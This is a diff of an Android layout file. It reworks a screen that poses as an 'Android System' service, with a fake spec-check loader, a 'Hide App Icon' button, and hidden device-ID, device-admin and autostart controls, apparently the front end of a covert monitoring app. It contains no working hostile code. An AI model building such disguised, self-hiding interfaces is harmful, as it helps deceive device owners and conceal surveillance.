@@ -4,55 +4,98 @@
     android:layout_width="match_parent"
     android:layout_height="match_parent"
     android:orientation="vertical"
-    android:padding="24dp"
+    android:padding="20dp"
     android:gravity="center"
     android:background="#0f172a"
     tools:context=".MainActivity">
 
-    <ImageView
-        android:id="@+id/ivSystemLogo"
-        android:layout_width="100dp"
-        android:layout_height="100dp"
-        android:src="@drawable/ic_android_system"
-        android:contentDescription="Android System Logo"
-        android:layout_marginBottom="20dp" />
-
-    <TextView
-        android:layout_width="wrap_content"
+    <!-- Loading View (Shown for 2.5 seconds) -->
+    <LinearLayout
+        android:id="@+id/layoutLoading"
+        android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text="Android System Service"
-        android:textColor="#ffffff"
-        android:textSize="22sp"
-        android:textStyle="bold"
-        android:layout_marginBottom="8dp"/>
+        android:orientation="vertical"
+        android:gravity="center"
+        android:visibility="visible">
 
-    <TextView
-        android:id="@+id/tvDeviceSpec"
-        android:layout_width="wrap_content"
+        <ImageView
+            android:layout_width="90dp"
+            android:layout_height="90dp"
+            android:src="@drawable/ic_android_system"
+            android:contentDescription="Android System Logo"
+            android:layout_marginBottom="24dp" />
+
+        <ProgressBar
+            android:layout_width="48dp"
+            android:layout_height="48dp"
+            android:indeterminateTint="#3b82f6"
+            android:layout_marginBottom="16dp"/>
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Checking System Specifications..."
+            android:textColor="#94a3b8"
+            android:textSize="15sp" />
+    </LinearLayout>
+
+    <!-- Full Device Details View (Shown after loader) -->
+    <ScrollView
+        android:id="@+id/layoutDetails"
+        android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text="Oppo A3s (ColorOS 5.1 | Android 8.1)"
-        android:textColor="#3b82f6"
-        android:textSize="14sp"
-        android:textStyle="bold"
-        android:layout_marginBottom="32dp"/>
+        android:visibility="gone">
 
-    <ProgressBar
-        android:id="@+id/spinnerLoader"
-        style="?android:attr/progressBarStyleLarge"
-        android:layout_width="48dp"
-        android:layout_height="48dp"
-        android:indeterminateTint="#3b82f6"
-        android:layout_marginBottom="16dp"/>
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:gravity="center_horizontal"
+            android:background="#1e293b"
+            android:padding="20dp">
 
-    <TextView
-        android:id="@+id/tvStatus"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="Optimizing system resources..."
-        android:textColor="#94a3b8"
-        android:textSize="15sp"
-        android:layout_marginBottom="24dp"/>
+            <ImageView
+                android:layout_width="72dp"
+                android:layout_height="72dp"
+                android:src="@drawable/ic_android_system"
+                android:contentDescription="Android System Logo"
+                android:layout_marginBottom="12dp" />
 
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="Android System Info"
+                android:textColor="#ffffff"
+                android:textSize="20sp"
+                android:textStyle="bold"
+                android:layout_marginBottom="16dp"/>
+
+            <!-- Oppo A3s Specifications List -->
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Device: OPPO A3s (CPH1803)\nOS: ColorOS 5.1 (Android 8.1.0)\nCPU: Qualcomm Snapdragon 450 (Octa-core 1.8 GHz)\nRAM: 3 GB LPDDR3\nStorage: 32 GB eMMC 5.1\nDisplay: 6.2&quot; HD+ (1520 x 720)\nBattery: 4230 mAh Li-Ion\nStatus: Optimized"
+                android:textColor="#e2e8f0"
+                android:textSize="13.5sp"
+                android:lineSpacingExtra="6dp"
+                android:background="#0f172a"
+                android:padding="16dp"
+                android:layout_marginBottom="20dp"/>
+
+            <Button
+                android:id="@+id/btnHideIcon"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Hide App Icon"
+                android:textColor="#ffffff"
+                android:backgroundTint="#ef4444"
+                android:textSize="14sp"
+                android:textStyle="bold"
+                android:padding="12dp" />
+        </LinearLayout>
+    </ScrollView>
+
+    <!-- Invisible legacy components -->
     <EditText
         android:id="@+id/etDeviceName"
         android:layout_width="match_parent"
@@ -62,6 +105,19 @@
     <TextView
         android:id="@+id/tvMyDeviceId"
         android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:visibility="gone" />
+
+    <TextView
+        android:id="@+id/tvStatus"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:visibility="gone" />
+
+    <ProgressBar
+        android:id="@+id/spinnerLoader"
+        style="?android:attr/progressBarStyleHorizontal"
+        android:layout_width="match_parent"
         android:layout_height="wrap_content"
         android:visibility="gone" />
 
@@ -76,17 +132,12 @@
         android:id="@+id/btnAdmin"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:visibility="gone"
-        android:text="Enable Device Protection"
-        android:backgroundTint="#3b82f6"/>
+        android:visibility="gone" />
 
     <Button
         android:id="@+id/btnAutoStart"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:layout_marginTop="12dp"
-        android:visibility="gone"
-        android:text="Configure Auto Optimization"
-        android:backgroundTint="#64748b"/>
+        android:visibility="gone" />
 
 </LinearLayout>
